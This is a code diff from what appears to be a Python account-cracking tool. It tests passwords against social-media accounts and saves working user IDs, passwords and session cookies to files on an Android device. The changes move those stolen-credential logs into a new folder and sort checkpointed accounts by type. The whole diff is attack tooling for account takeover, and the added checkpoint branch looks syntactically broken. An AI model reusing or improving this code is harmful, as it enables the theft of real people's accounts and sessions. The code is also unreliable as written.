@@ -1462,7 +1462,7 @@ def p(uid,pwx,tl):
                 if "live" in check:
                     if not response.get("is_account_confirmed", True):
                         print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        open("/sdcard/ATOM-ALL-FILE/ATOM-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
                         bkas.append(cid)
@@ -1472,17 +1472,21 @@ def p(uid,pwx,tl):
                         else:
                            print(f" {green}(ATOM-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           open("/sdcard/ATOM-ALL-FILE/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                            oks.append(cid)
                            break
                 else:
                     break
-            elif 'checkpoint' in response:
-                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
-                cps.append(uid)
-                break
+            elif "checkpoint" in po.lower():
+               if "confirm your identity on another device" in po.lower() or "log in from a device" in po.lower():
+                  print(f"[device cnfrm cp] {uid}|{pw}")
+                  open("/sdcard/ATOM-ALL-FILE/DEVICE-CHECKPOINT.txt", "a").write(f"{uid}|{pw}\n")
+                  cps.append(uid)
+               else:
+                  print(f"[GENERAL CHECKPOINT] {uid}|{pw}")
+                  open("/sdcard/ATOM-ALL-FILE/ATOM-CP.txt", "a").write(f"{uid}|{pw}\n")
+                  cps.append(uid)
+    break
             else:
                 continue
         loop+=1
